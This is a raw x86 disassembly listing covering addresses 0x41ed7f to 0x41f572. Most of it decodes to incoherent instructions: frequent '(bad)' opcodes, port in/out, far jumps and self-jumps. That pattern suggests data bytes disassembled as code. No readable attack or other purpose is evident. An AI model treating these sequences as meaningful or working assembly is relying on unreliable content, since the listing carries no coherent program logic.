  41ed7f:	add    al,ah
  41ed81:	jmp    0x702:0xffe2df04
  41ed88:	test   eax,0xc3f3c3ec
  41ed8d:	sti    
  41ed8e:	shl    cl,cl
  41ed90:	mov    cl,0xfb
  41ed92:	mov    edx,0xbcddedc6
  41ed97:	aad    0xfb
  41ed99:	in     eax,dx
  41ed9a:	sar    dl,0xf0
  41ed9d:	not    edi
  41ed9f:	loop   0x41ed99
  41eda1:	(bad)  
  41eda3:	inc    esi
  41eda5:	add    eax,0xbdb100e3
  41edaa:	mov    bh,0xa4
  41edac:	mov    al,0xd5
  41edae:	(bad)  
  41edaf:	rcr    cl,1
  41edb1:	clc    
  41edb2:	in     eax,0xd2
  41edb4:	(bad)  
  41edb5:	mov    dl,0xcd
  41edb7:	xlat   BYTE PTR ds:[ebx]
  41edb8:	fistp  QWORD PTR [esi-0xe210701]
  41edbe:	loopne 0x41edb5
  41edc0:	fdivp  st(7),st
  41edc2:	loop   0x41ed99
  41edc4:	stc    
  41edc5:	out    0xde,eax
  41edc7:	loope  0x41ed88
  41edc9:	icebp  
  41edca:	leave  
  41edcb:	jecxz  0x41ed80
  41edcd:	rep lods al,BYTE PTR ds:[esi]
  41edcf:	shr    ch,0xf0
  41edd2:	stc    
  41edd3:	mov    ebx,0xcec8ccb8
  41edd8:	fcmovu st,st(7)
  41edda:	mov    ebp,0x402f103
  41eddf:	sar    ebx,0xe6
  41ede2:	jmp    0x41ede1
  41ede4:	sti    
  41ede5:	fiadd  DWORD PTR ds:0xcbe5e2e5
  41edeb:	scas   eax,DWORD PTR es:[edi]
  41edec:	into   
  41eded:	in     al,0xef
  41edef:	lock into 
  41edf1:	xlat   BYTE PTR ds:[ebx]
  41edf2:	aad    0xd2
  41edf4:	stc    
  41edf5:	in     al,0xbe
  41edf7:	div    cl
  41edf9:	mov    esi,0xdfc7dcbc
  41edfe:	shl    esp,0xdf
  41ee01:	jmp    0x41ee09
  41ee03:	or     esi,esp
  41ee05:	(bad)  
  41ee07:	fidiv  WORD PTR [edx-0x3d52112e]
  41ee0d:	retf   
  41ee0e:	jmp    0x41edc2
  41ee10:	mov    al,0xb5
  41ee12:	lock fcom st(0)
  41ee15:	cmc    
  41ee16:	jmp    0xdbf5:0xbcbed2dc
  41ee1d:	add    eax,0xd5dee9c0
  41ee22:	(bad)  
  41ee23:	out    dx,eax
  41ee24:	(bad)  
  41ee25:	repz (bad) 
  41ee27:	fucomip st,st(4)
  41ee29:	mov    ebp,0xeeefb3f0
  41ee2e:	fcmovnbe st,st(0)
  41ee30:	sti    
  41ee31:	repnz in al,dx
  41ee33:	(bad)  
  41ee34:	(bad)  
  41ee35:	mov    ah,0xc9
  41ee37:	fcmovnbe st,st(5)
  41ee39:	ret    
  41ee3a:	int3   
  41ee3b:	loop   0x41ee33
  41ee3d:	(bad)  
  41ee3e:	rol    esi,cl
  41ee40:	ret    0xf9fa
  41ee43:	push   cs
  41ee44:	loop   0x41ee14
  41ee46:	jmp    0x41ee46
  41ee48:	mov    cl,0xcf
  41ee4a:	shl    esi,1
  41ee4c:	(bad)  
  41ee4d:	call   0xb902c505
  41ee52:	leave  
  41ee53:	cli    
  41ee54:	enter  0xeef1,0xf8
  41ee58:	aam    0xfa
  41ee5a:	push   es
  41ee5b:	shl    ah,cl
  41ee5d:	repnz add eax,DWORD PTR [edx]
  41ee60:	std    
  41ee61:	test   edi,0xe9cef405
  41ee67:	in     al,0xe7
  41ee69:	icebp  
  41ee6a:	mov    esp,0xe6d4ecb2
  41ee6f:	mov    dl,0xce
  41ee71:	lock in eax,0xf5
  41ee74:	hlt    
  41ee75:	jmp    0xc1cc:0xd1f3f202
  41ee7c:	add    ebx,esp
  41ee7e:	sti    
  41ee7f:	cmc    
  41ee80:	xlat   BYTE PTR ds:[ebx]
  41ee81:	fsubrp st(4),st
  41ee83:	(bad)  
  41ee85:	(bad)  
  41ee86:	(bad)  
  41ee87:	jmp    0xaf2ec05a
  41ee8c:	jecxz  0x41ee73
  41ee8e:	out    dx,eax
  41ee8f:	retf   0xced2
  41ee92:	call   0xd237b392
  41ee97:	fadd   st,st(2)
  41ee99:	int    0xe1
  41ee9b:	int    0xf4
  41ee9d:	fst    st(7)
  41ee9f:	jmp    0x405:0xdfc0d0e2
  41eea6:	add    al,0x7
  41eea8:	jmp    0xea1ea16b
  41eead:	cmc    
  41eeae:	ror    al,1
  41eeb0:	mov    ch,0xcd
  41eeb2:	in     al,0xf9
  41eeb4:	jmp    0xf2c1:0x3bae2e4
  41eebb:	fsub   st,st(3)
  41eebd:	std    
  41eebe:	out    0xc7,eax
  41eec0:	or     DWORD PTR [eax],eax
  41eec2:	add    DWORD PTR [esp+esi*8-0x46131613],edi
  41eec9:	shl    esi,0xcb
  41eecc:	(bad)  
  41eecd:	out    0xc2,al
  41eecf:	rol    dh,1
  41eed1:	out    0xe6,al
  41eed3:	not    bh
  41eed5:	(bad)  
  41eed7:	fadd   st(2),st
  41eed9:	fcom   st(0)
  41eedb:	push   es
  41eedc:	(bad)  
  41eedd:	sti    
  41eede:	(bad)  
  41eedf:	sti    
  41eee0:	sti    
  41eee1:	or     eax,edi
  41eee3:	lsl    ebx,di
  41eee6:	jmp    eax
  41eee8:	test   al,0xd3
  41eeea:	leave  
  41eeeb:	ret    0xc0c6
  41eeee:	icebp  
  41eeef:	jmp    0xdfca:0xebb6dbce
  41eef6:	shl    bl,cl
  41eef8:	mov    ebx,0xf3d6dcd3
  41eefd:	clc    
  41eefe:	mov    esp,0xe306daf7
  41ef03:	add    ecx,edi
  41ef05:	iret   
  41ef06:	fcmovu st,st(7)
  41ef08:	test   eax,0xcac1b7c1
  41ef0d:	(bad)  [edx-0xb200811]
  41ef13:	mov    eax,0x2cfb4ca
  41ef18:	loope  0x41ef09
  41ef1a:	aam    0xd7
  41ef1c:	in     eax,0xec
  41ef1e:	repz out 0xf1,eax
  41ef21:	pmulhuw mm3,mm1
  41ef24:	fmul   st,st(6)
  41ef26:	or     esi,ebp
  41ef28:	loop   0x41ef16
  41ef2a:	fucomip st,st(6)
  41ef2c:	loop   0x41ef0e
  41ef2e:	into   
  41ef2f:	(bad)  
  41ef30:	sti    
  41ef31:	mov    dh,0xba
  41ef33:	mov    al,0xd0
  41ef35:	repz repnz jecxz 0x41ef30
  41ef39:	jecxz  0x41ef39
  41ef3b:	cli    
  41ef3c:	(bad)  
  41ef3e:	push   es
  41ef3f:	fst    st(1)
  41ef41:	add    dl,cl
  41ef43:	enter  0xfb04,0xd9
  41ef47:	or     al,0xe5
  41ef49:	jmp    0xee11c73c
  41ef4e:	lods   al,BYTE PTR ds:[esi]
  41ef4f:	ror    bl,cl
  41ef51:	aad    0xcb
  41ef53:	mov    ah,0xeb
  41ef55:	int    0xf6
  41ef57:	aad    0xbb
  41ef59:	xlat   BYTE PTR ds:[ebx]
  41ef5a:	xlat   BYTE PTR ds:[ebx]
  41ef5b:	rol    DWORD PTR [eax],0xfe
  41ef5e:	jecxz  0x41ef40
  41ef60:	fucom  st(5)
  41ef62:	add    eax,eax
  41ef64:	leave  
  41ef65:	or     cl,dh
  41ef67:	in     al,0xf3
  41ef69:	mov    esp,0xf2e6c7d6
  41ef6e:	rcl    edx,cl
  41ef70:	leave  
  41ef71:	mov    ecx,0xcdd8d7da
  41ef76:	mov    eax,0xbebaf2f6
  41ef7b:	std    
  41ef7c:	(bad)  
  41ef7d:	fdiv   st(3),st
  41ef7f:	sti    
  41ef80:	(bad)  
  41ef81:	(bad)  
  41ef83:	fmul   DWORD PTR [ecx]
  41ef85:	or     ah,ch
  41ef87:	iret   
  41ef88:	jmp    0x41ef39
  41ef8a:	jmp    0x41ef53
  41ef8c:	lods   al,BYTE PTR ds:[esi]
  41ef8d:	rol    dl,cl
  41ef8f:	mov    ah,0xf7
  41ef91:	fldlg2 
  41ef93:	aad    0xc5
  41ef95:	jmp    0xf300da6c
  41ef9a:	mov    ebp,0xdc02f6
  41ef9f:	add    ch,ah
  41efa1:	hlt    
  41efa2:	aad    0xc9
  41efa4:	int    0x2
  41efa6:	iret   
  41efa7:	push   cs
  41efa8:	mov    cl,0xac
  41efaa:	fnstsw WORD PTR [ebp-0x3d3f0b0c]
  41efb0:	fcmove st,st(2)
  41efb2:	(bad)  
  41efb4:	(bad)
  41efb7:	leave  
  41efb8:	cli    
  41efb9:	cmc    
  41efba:	mov    ebp,0xe1dadaff
  41efbf:	fcomi  st,st(6)
  41efc1:	rcl    ch,1
  41efc3:	push   es
  41efc4:	add    edx,DWORD PTR [ebx]
  41efc6:	pop    es
  41efc7:	out    dx,eax
  41efc8:	jecxz  0x41ef7c
  41efca:	lds    ebp,FWORD PTR [ecx+eax*8-0x48051139]
  41efd1:	in     al,0xeb
  41efd3:	xlat   BYTE PTR ds:[ebx]
  41efd4:	out    dx,eax
  41efd5:	(bad)  
  41efd6:	repnz (bad) 
  41efd9:	fadd   QWORD PTR [ecx]
  41efdb:	ffree  st(7)
  41efdd:	loopne 0x41efe6
  41efdf:	icebp  
  41efe0:	aam    0xc2
  41efe2:	fcmovbe st,st(4)
  41efe4:	or     eax,0xe5f9e3e2
  41efe9:	mov    bh,0xc7
  41efec:	ror    ah,cl
  41efee:	xlat   BYTE PTR ds:[ebx]
  41efef:	cli    
  41eff0:	mov    ebx,0xecc8ebf4
  41eff5:	into   
  41eff6:	(bad)  
  41eff7:	shr    eax,cl
  41eff9:	into   
  41effa:	into   
  41effb:	(bad)  
  41effc:	cmc    
  41effd:	fsub   st(3),st
  41efff:	icebp  
  41f000:	mov    edi,0xe10e0800
  41f005:	fild   WORD PTR [ebx]
  41f007:	or     al,bh
  41f009:	mov    esi,0xaee6f3d2
  41f00e:	not    ah
  41f010:	rcl    esi,cl
  41f012:	mov    ecx,0xe3fbebdd
  41f017:	icebp  
  41f018:	cli    
  41f019:	int    0xf6
  41f01b:	ret    
  41f01c:	int3   
  41f01d:	out    0xda,al
  41f01f:	les    ecx,FWORD PTR [edx]
  41f021:	stc    
  41f022:	leave  
  41f023:	sti    
  41f024:	clc    
  41f025:	cli    
  41f026:	fcmovbe st,st(2)
  41f028:	fnstsw WORD PTR [esi-0x3e224112]
  41f02e:	fisubr DWORD PTR [ebp+esi*8-0x3170136]
  41f035:	(bad)  
  41f036:	rcl    ch,cl
  41f038:	out    dx,eax
  41f039:	fcomi  st,st(5)
  41f03b:	icebp  
  41f03c:	cmc    
  41f03d:	add    eax,0xcbe905c5
  41f042:	add    al,0xca
  41f044:	fyl2xp1 
  41f046:	call   0xed29dd38
  41f04b:	leave  
  41f04c:	lods   al,BYTE PTR ds:[esi]
  41f04d:	(bad)  
  41f050:	(bad)  
  41f051:	aam    0xee
  41f053:	cli    
  41f054:	in     al,dx
  41f055:	jmp    0xf044a538
  41f05a:	mov    edi,0xf8e6fdc2
  41f05f:	mov    esp,0xc5c6d7f4
  41f064:	or     BYTE PTR [esi],cl
  41f066:	in     al,dx
  41f067:	add    al,0xbf
  41f069:	mov    al,0xe9
  41f06b:	fsubp  st(5),st
  41f06d:	in     eax,dx
  41f06e:	test   eax,0xbacdbbee
  41f073:	in     al,dx
  41f074:	cld    
  41f075:	neg    dl
  41f077:	sti    
  41f078:	xlat   BYTE PTR ds:[ebx]
  41f079:	ret    0xc7e2
  41f07c:	sar    DWORD PTR [ebp-0x25183b08],cl
  41f082:	jmp    0x41f048
  41f084:	or     eax,0xc7e3d9ce
  41f089:	repnz repz shr bh,0xe6
  41f08e:	mov    bl,0xbb
  41f090:	sti    
  41f091:	fcomp  st(6)
  41f093:	int    0xd8
  41f095:	aad    0xb5
  41f097:	mov    edx,0xcce3b8ec
  41f09c:	repz cld 
  41f09e:	(bad)  
  41f09f:	fisttp DWORD PTR [eax]
  41f0a1:	xlat   BYTE PTR ds:[ebx]
  41f0a2:	add    esp,ebx
  41f0a4:	ret    
  41f0a5:	std    
  41f0a6:	(bad)  
  41f0a8:	leave  
  41f0a9:	int3   
  41f0aa:	test   eax,0xdbf1d3f6
  41f0b0:	mov    ecx,0xfde4f5ee
  41f0b5:	mov    ah,0xb4
  41f0b7:	iret   
  41f0b8:	mov    edx,0xe1e7f2d2
  41f0bd:	loope  0x41f098
  41f0bf:	mov    eax,0xc7d40405
  41f0c4:	(bad)  
  41f0c5:	or     eax,0xb3efeefb
  41f0ca:	out    dx,al
  41f0cb:	retf   0xedf2
  41f0ce:	rol    ah,0xd7
  41f0d1:	sar    BYTE PTR [ecx-0x6260c33],cl
  41f0d7:	xlat   BYTE PTR ds:[ebx]
  41f0d8:	into   
  41f0d9:	aad    0xdd
  41f0db:	add    esi,edi
  41f0dd:	add    al,0xe2
  41f0df:	cli    
  41f0e0:	(bad)  
  41f0e1:	or     DWORD PTR [ecx],ecx
  41f0e3:	fnsetpm(287 only) 
  41f0e5:	add    ebp,eax
  41f0e7:	std    
  41f0e8:	loopne 0x41f0b2
  41f0ea:	into   
  41f0eb:	mov    esi,0xe1d7f5e2
  41f0f0:	repnz repnz mov ch,0xe6
  41f0f4:	push   esp
  41f0f6:	mov    ch,0xf5
  41f0f8:	enter  0xcff4,0xcd
  41f0fc:	loop   0x41f0d9
  41f0fe:	vpaddb xmm1,xmm5,XMMWORD PTR [eax]
  41f102:	add    cl,dh
  41f104:	or     al,BYTE PTR [eax]
  41f106:	in     eax,0xfa
  41f108:	mov    dl,0xc9
  41f10a:	in     al,dx
  41f10b:	(bad)  
  41f10d:	loop   0x41f0e4
  41f10f:	(bad)  
  41f110:	into   
  41f111:	(bad)  
  41f112:	aad    0xfd
  41f114:	hlt    
  41f115:	cli    
  41f116:	repz sar cl,cl
  41f119:	stc    
  41f11a:	loope  0x41f0ea
  41f11c:	out    0xbd,al
  41f11e:	div    al
  41f120:	add    al,BYTE PTR [esi]
  41f122:	idiv   BYTE PTR [ebp+esi*8-0x1826f015]
  41f129:	sar    BYTE PTR [esi-0x32191123],1
  41f12f:	(bad)  
  41f131:	loopne 0x41f0fc
  41f133:	(bad)  
  41f134:	call   0x123b135
  41f139:	div    ah
  41f13b:	xlat   BYTE PTR ds:[ebx]
  41f13c:	rcl    esp,0xe4
  41f13f:	(bad)  
  41f140:	(bad)  
  41f141:	(bad)  
  41f143:	loope  0x41f152
  41f145:	in     al,0xe2
  41f147:	repz loop 0x41f13a
  41f14a:	loopne 0x41f118
  41f14c:	retf   0xc3b3
  41f14f:	sti    
  41f150:	mov    ah,0xb0
  41f152:	(bad)  
  41f153:	call   eax
  41f155:	retf   
  41f156:	hlt    
  41f157:	fld    st(2)
  41f159:	icebp  
  41f15a:	xlat   BYTE PTR ds:[ebx]
  41f15b:	clc    
  41f15c:	mov    esi,0xe2f601c6
  41f161:	xlat   BYTE PTR ds:[ebx]
  41f162:	jmp    0xe335d423
  41f167:	jmp    0xaaee:0xd0cdb2ed
  41f16e:	out    dx,al
  41f16f:	out    dx,eax
  41f170:	repnz cli 
  41f172:	mov    edx,0x2c9dcf6
  41f177:	fdiv   st,st(0)
  41f179:	int3   
  41f17a:	cld    
  41f17b:	std    
  41f17c:	out    0x2,eax
  41f17e:	add    al,0xe3
  41f180:	fiadd  DWORD PTR ds:0xefed5df
  41f186:	psubsw mm4,QWORD PTR [edi-0x3c192109]
  41f18d:	in     eax,0xd5
  41f18f:	in     eax,0xf1
  41f191:	retf   
  41f192:	xlat   BYTE PTR ds:[ebx]
  41f193:	repz lock repz mov eax,0xdfccd4fc
  41f19b:	hlt    
  41f19c:	rcl    ebp,1
  41f19e:	bnd jmp 0x925b095
  41f1a4:	stc    
  41f1a5:	or     BYTE PTR [ebx],cl
  41f1a7:	ffree  st(3)
  41f1a9:	call   0xb415bb97
  41f1ae:	fcmovnbe st,st(4)
  41f1b0:	lock shl DWORD PTR [eax-0x2b420a0b],cl
  41f1b7:	fucomi st,st(6)
  41f1b9:	loope  0x41f187
  41f1bb:	clc    
  41f1bc:	in     al,dx
  41f1bd:	(bad)  
  41f1be:	(bad)  
  41f1c0:	jmp    0xfe11d0be
  41f1c5:	iret   
  41f1c6:	cli    
  41f1c7:	iret   
  41f1c8:	jecxz  0x41f1b3
  41f1ca:	in     al,dx
  41f1cb:	ror    ah,cl
  41f1cd:	loope  0x41f190
  41f1cf:	retf   0xf5d4
  41f1d2:	fdivr  st,st(0)
  41f1d4:	mov    ebp,0xc9d9b9f3
  41f1d9:	fucomp st(5)
  41f1db:	std    
  41f1dc:	add    eax,0xf709d5e5
  41f1e1:	call   0xcc20c0eb
  41f1e6:	out    0xed,al
  41f1e8:	test   eax,0xf0c7eeb8
  41f1ed:	shl    bh,0xcd
  41f1f0:	(bad)  
  41f1f1:	vpor   ymm7,ymm1,ymm6
  41f1f5:	jecxz  0x41f1ab
  41f1f7:	mov    ecx,0xeee6eece
  41f1fc:	(bad)  
  41f1fd:	int3   
  41f1fe:	fcom   st(7)
  41f200:	add    al,0xd9
  41f202:	retf   0xe6ed
  41f205:	int    0xf
  41f207:	add    dh,BYTE PTR [ecx-0x15295253]
  41f20d:	mov    bl,0xc2
  41f20f:	ret    0xede4
  41f212:	in     eax,0xcf
  41f214:	fcmovnbe st,st(2)
  41f216:	icebp  
  41f217:	retf   0xd7c1
  41f21a:	repz mov ebp,0xf0f200d5
  41f220:	sar    al,1
  41f222:	(bad)  
  41f223:	mov    esp,0xece20efc
  41f228:	into   
  41f229:	lods   al,BYTE PTR ds:[esi]
  41f22a:	(bad)  
  41f22b:	shl    ebx,1
  41f22d:	jmp    0xb7fbd822
  41f232:	in     eax,dx
  41f233:	hlt    
  41f234:	retf   0xb9fa
  41f237:	add    esi,ebx
  41f239:	fld    QWORD PTR [eax]
  41f23b:	sar    DWORD PTR [ebp-0x3c1c4634],0x1
  41f242:	or     esi,ebx
  41f244:	in     al,dx
  41f245:	or     ecx,DWORD PTR [ecx]
  41f247:	jmp    0xedf4:0xe9afbfe0
  41f24e:	rcr    ebx,0xcb
  41f251:	vpsubusw ymm6,ymm3,YMMWORD PTR [esi-0x1d372c11]
  41f259:	mov    edi,0xc0c3f7f9
  41f25e:	(bad)  
  41f260:	(bad)
  41f263:	(bad)  
  41f264:	stc    
  41f265:	hlt    
  41f266:	add    bl,cl
  41f268:	repnz mov ebp,0xaee2c6a9
  41f26e:	xlat   BYTE PTR ds:[ebx]
  41f26f:	(bad)
  41f272:	in     eax,dx
  41f273:	mov    esi,0xcedaffb6
  41f278:	fnstsw ax
  41f27a:	mov    DWORD PTR ds:0xf1e3f8dd,0x80fdbc9
  41f284:	retf   
  41f285:	(bad)  
  41f286:	clc    
  41f287:	add    esp,eax
  41f289:	mov    edi,0xdbc6cde7
  41f28e:	(bad)
  41f292:	out    dx,eax
  41f293:	mov    ebx,0xfcf0bcd7
  41f298:	add    esi,esi
  41f29a:	(bad)  
  41f29b:	repz (bad) 
  41f29e:	add    eax,0xd9dfe0c4
  41f2a3:	mov    esp,0xec403fa
  41f2a8:	iret   
  41f2a9:	xlat   BYTE PTR ds:[ebx]
  41f2aa:	shl    BYTE PTR [edi+ebp*8-0x4c251b53],0xca
  41f2b2:	enter  0xbeda,0xb6
  41f2b6:	mov    ebp,0xdedcffd0
  41f2bb:	cld    
  41f2bc:	add    bl,dl
  41f2be:	jmp    0x41f280
  41f2c0:	or     dh,al
  41f2c2:	push   es
  41f2c3:	cmc    
  41f2c4:	push   cs
  41f2c5:	sti    
  41f2c6:	or     al,0x4
  41f2c8:	jmp    0x41f277
  41f2ca:	enter  0xe4dc,0xae
  41f2ce:	int    0xb0
  41f2d0:	in     eax,0xb0
  41f2d2:	fsub   st,st(6)
  41f2d4:	clc    
  41f2d5:	mov    dh,0xbf
  41f2d7:	int    0xce
  41f2d9:	mov    esi,0xf503d0fe
  41f2de:	(bad)  
  41f2df:	loope  0x41f2bd
  41f2e1:	fsub   st,st(1)
  41f2e3:	jmp    0xcb50f6d0
  41f2e8:	retf   0xbfb1
  41f2eb:	retf   
  41f2ec:	shr    ah,0xa9
  41f2ef:	repz repz mov dl,0xf0
  41f2f3:	fdivp  st(4),st
  41f2f5:	sti    
  41f2f6:	retf   
  41f2f7:	idiv   esi
  41f2f9:	jecxz  0x41f2e8
  41f2fb:	push   es
  41f2fc:	ret    
  41f2fd:	mov    esi,0xfbc3c1cb
  41f302:	add    dl,bl
  41f304:	or     al,cl
  41f306:	int3   
  41f307:	loopne 0x41f2d6
  41f309:	in     al,dx
  41f30a:	lods   eax,DWORD PTR ds:[esi]
  41f30b:	mov    cl,0xe4
  41f30d:	repnz in al,dx
  41f30f:	into   
  41f310:	xlat   BYTE PTR ds:[ebx]
  41f311:	aad    0xf5
  41f313:	in     eax,dx
  41f314:	mov    eax,0xffeff5f6
  41f319:	into   
  41f31a:	sar    ah,1
  41f31c:	fiadd  DWORD PTR ds:0x5bfd5f8
  41f322:	(bad)  
  41f323:	call   0xe73ce10e
  41f328:	mov    cl,0xae
  41f32a:	fsubp  st(3),st
  41f32c:	shr    BYTE PTR [esi-0x3625454a],cl
  41f332:	out    dx,al
  41f333:	neg    esp
  41f335:	shl    esp,1
  41f337:	add    dh,dh
  41f339:	loop   0x41f33a
  41f33b:	sti    
  41f33c:	add    al,0xe1
  41f33e:	les    ecx,FWORD PTR [edx]
  41f340:	stc    
  41f341:	push   es
  41f342:	(bad)  
  41f343:	stc    
  41f344:	aad    0xe8
  41f346:	stc    
  41f347:	sar    BYTE PTR [edi-0x132c4e1b],cl
  41f34d:	aam    0xe5
  41f34f:	cmc    
  41f350:	mov    ah,0xe0
  41f352:	mov    ebx,0xe8cdd0e4
  41f357:	int3   
  41f358:	add    DWORD PTR [eax],eax
  41f35a:	ret    
  41f35b:	cli    
  41f35c:	(bad)  
  41f35e:	std    
  41f35f:	push   es
  41f360:	jecxz  0x41f339
  41f362:	mov    ebp,0xc8f9c607
  41f367:	push   cs
  41f368:	leave  
  41f369:	fst    st(7)
  41f36b:	out    dx,al
  41f36c:	mov    al,0xcf
  41f36e:	xlat   BYTE PTR ds:[ebx]
  41f36f:	hlt    
  41f370:	retf   0xcecb
  41f373:	cmc    
  41f374:	fcmovne st,st(0)
  41f376:	xlat   BYTE PTR ds:[ebx]
  41f377:	loope  0x41f345
  41f379:	mov    ecx,0x503f0c1
  41f37e:	add    ah,bl
  41f380:	(bad)  
  41f381:	(bad)  
  41f382:	call   0xe32afb64
  41f387:	out    0xeb,eax
  41f389:	rol    bl,1
  41f38b:	in     eax,dx
  41f38c:	loop   0x41f33e
  41f38e:	jmp    0xe519ba7e
  41f393:	clc    
  41f394:	enter  0xeeb2,0xef
  41f398:	jecxz  0x41f39a
  41f39a:	cld    
  41f39b:	out    0xf2,eax
  41f39d:	std    
  41f39e:	xlat   BYTE PTR ds:[ebx]
  41f39f:	sti    
  41f3a0:	jecxz  0x41f39c
  41f3a2:	fcmove st,st(3)
  41f3a4:	loop   0x41f37e
  41f3a6:	loopne 0x41f3aa
  41f3a8:	repz leave 
  41f3aa:	jmp    0x41f391
  41f3ac:	out    0xcb,eax
  41f3ae:	int    0xcb
  41f3b0:	aad    0xcf
  41f3b2:	sar    bl,cl
  41f3b4:	retf   
  41f3b5:	retf   
  41f3b6:	cli    
  41f3b7:	enter  0xfe02,0xf3
  41f3bb:	std    
  41f3bc:	loope  0x41f3bf
  41f3be:	rol    cl,1
  41f3c0:	(bad)  
  41f3c2:	retf   0x1eb
  41f3c5:	clc    
  41f3c6:	leave  
  41f3c7:	int3   
  41f3c8:	mov    dl,0xad
  41f3ca:	call   0xc130e3ab
  41f3cf:	mov    cl,0xeb
  41f3d1:	lock jmp 0xbafe:0xbbd7f0f2
  41f3d9:	fadd   st(1),st
  41f3db:	pop    es
  41f3dc:	cli    
  41f3dd:	add    ah,ch
  41f3df:	ffree  st(3)
  41f3e1:	add    esp,ebx
  41f3e3:	pop    es
  41f3e4:	add    bh,cl
  41f3e6:	add    cl,BYTE PTR [eax]
  41f3e8:	repnz lods eax,DWORD PTR ds:[esi]
  41f3ea:	mov    ebp,0xb5ebece5
  41f3ef:	lock mov dh,0xfa
  41f3f2:	in     eax,0xd9
  41f3f4:	(bad)  
  41f3f5:	jmp    0x41f3e0
  41f3f7:	(bad)  
  41f3f9:	dec    dh
  41f3fb:	inc    BYTE PTR [esi]
  41f3fd:	(bad)  
  41f3fe:	mov    esp,0xe7c8faff
  41f403:	sti    
  41f404:	stc    
  41f405:	add    al,0xd9
  41f407:	jecxz  0x41f3c7
  41f409:	test   eax,0xc0e7c3f2
  41f40e:	in     eax,dx
  41f40f:	rcl    edx,0xd2
  41f412:	in     al,0xe8
  41f414:	into   
  41f415:	into   
  41f416:	mov    edx,0xccd1ec01
  41f41b:	loop   0x41f3de
  41f41d:	loope  0x41f3f0
  41f41f:	(bad)  
  41f420:	(bad)  
  41f422:	(bad)  
  41f423:	jmp    0x41f403
  41f425:	(bad)  
  41f427:	or     esi,eax
  41f429:	retf   
  41f42a:	mov    esp,0xd0cab1b0
  41f42f:	aam    0xd4
  41f431:	iret   
  41f432:	imul   eax
  41f434:	not    eax
  41f436:	(bad)  
  41f437:	ret    
  41f438:	lock cld 
  41f43a:	icebp  
  41f43b:	fnstsw WORD PTR [edi-0x400432c]
  41f441:	sti    
  41f442:	mov    dh,0xc9
  41f445:	pop    es
  41f446:	std    
  41f447:	stc    
  41f448:	scas   al,BYTE PTR es:[edi]
  41f449:	shr    DWORD PTR [edi-0x3851181a],cl
  41f44f:	cmc    
  41f450:	fxch   st(3)
  41f452:	out    0xf2,eax
  41f454:	mov    ecx,0xe0f1eeff
  41f459:	ror    esi,0xec
  41f45c:	repz std 
  41f45e:	rol    dh,cl
  41f460:	in     al,0xda
  41f462:	fld    QWORD PTR ds:0xc001feef
  41f468:	into   
  41f469:	mov    esi,0xe5f0e2cb
  41f46e:	ror    cl,cl
  41f470:	shl    dl,0xef
  41f473:	lock fdivp st(4),st
  41f476:	mov    ecx,0xe6ddbaf2
  41f47b:	sar    eax,0x6
  41f47e:	add    eax,0x7fb090a
  41f483:	(bad)  
  41f484:	out    dx,al
  41f485:	out    0x4,eax
  41f487:	in     al,dx
  41f488:	iret   
  41f489:	retf   0xc2e9
  41f48c:	repz loop 0x41f45f
  41f48f:	(bad)  
  41f490:	cmc    
  41f491:	shl    bh,1
  41f493:	aam    0xe4
  41f495:	mov    ah,0xd9
  41f497:	aam    0xd2
  41f499:	sti    
  41f49a:	(bad)  
  41f49b:	mov    eax,0x5f6e2d5
  41f4a0:	or     edi,eax
  41f4a2:	call   0xe34adaa0
  41f4a7:	add    esp,esp
  41f4a9:	leave  
  41f4aa:	mov    bl,0xd7
  41f4ac:	retf   0xacc9
  41f4af:	fsqrt  
  41f4b1:	vpsubusw xmm7,xmm0,xmm1
  41f4b5:	mov    dl,0xb8
  41f4b7:	iret   
  41f4b8:	(bad)  
  41f4b9:	out    dx,al
  41f4ba:	stc    
  41f4bb:	aad    0xcc
  41f4bd:	lock (bad) 
  41f4bf:	ffreep st(6)
  41f4c1:	add    edx,edi
  41f4c3:	retf   0xe3d4
  41f4c6:	adc    al,BYTE PTR [edi]
  41f4c8:	mov    esp,0xc8e7c9ef
  41f4cd:	(bad)
  41f4d0:	jmp    0x41f492
  41f4d2:	lods   eax,DWORD PTR ds:[esi]
  41f4d3:	mov    edx,0xbbcadbdc
  41f4d8:	clc    
  41f4d9:	(bad)  
  41f4db:	mov    esi,0xf7f8c3de
  41f4e0:	ret    
  41f4e1:	add    bh,dh
  41f4e3:	prefetchw (bad)
  41f4e4:	or     eax,0xca07dacd
  41f4e9:	loop   0x41f4ab
  41f4eb:	(bad)  
  41f4ec:	out    0xc7,al
  41f4ee:	into   
  41f4ef:	call   0xfc34e2c2
  41f4f4:	mov    edi,0xc3bfdcd0
  41f4f9:	ret    0xd0d9
  41f4fc:	icebp  
  41f4fd:	sti    
  41f4fe:	lock or dl,cl
  41f501:	out    dx,eax
  41f502:	(bad)  
  41f504:	pop    es
  41f505:	in     eax,0xe3
  41f507:	out    0xe1,eax
  41f509:	in     al,0xd7
  41f50b:	in     al,dx
  41f50c:	out    dx,al
  41f50d:	mov    ch,0xf7
  41f50f:	int    0xf4
  41f511:	mov    edx,0xcbfceeb4
  41f516:	add    edi,edx
  41f518:	clc    
  41f519:	loope  0x41f4ea
  41f51b:	push   es
  41f51c:	add    esi,eax
  41f51e:	lock add al,0x1
  41f521:	ret    0xdbc5
  41f524:	fxch   st(3)
  41f526:	(bad)  
  41f527:	cli    
  41f528:	lods   al,BYTE PTR ds:[esi]
  41f529:	out    dx,eax
  41f52a:	div    cl
  41f52c:	xlat   BYTE PTR ds:[ebx]
  41f52d:	ret    
  41f52e:	out    0xf1,al
  41f530:	mov    bh,0xdb
  41f532:	fucomi st,st(7)
  41f534:	in     eax,dx
  41f535:	(bad)  
  41f536:	(bad)  
  41f538:	sti    
  41f539:	icebp  
  41f53a:	cli    
  41f53b:	aam    0xe3
  41f53d:	fcomp  st(4)
  41f53f:	(bad)  
  41f540:	or     esi,edi
  41f542:	pop    es
  41f543:	cmc    
  41f544:	fucomp st(6)
  41f546:	in     al,0xf8
  41f548:	mov    bl,0xed
  41f54a:	not    al
  41f54c:	iret   
  41f54d:	lods   al,BYTE PTR ds:[esi]
  41f54e:	out    0xce,eax
  41f550:	in     al,dx
  41f551:	mov    al,0xbb
  41f553:	jmp    0xb9f3:0xdcf2d6d9
  41f55a:	rcr    eax,cl
  41f55c:	(bad)  
  41f55e:	not    edx
  41f560:	aam    0x2
  41f562:	(bad)  
  41f563:	jecxz  0x41f551
  41f565:	or     al,BYTE PTR [edi]
  41f567:	out    0xbe,eax
  41f569:	ret    0xb6e3
  41f56c:	loopne 0x41f557
  41f56e:	out    0xcf,al
  41f570:	in     eax,0xda
  41f572:	shl    DWORD PTR [ebp-0x3c274612],1
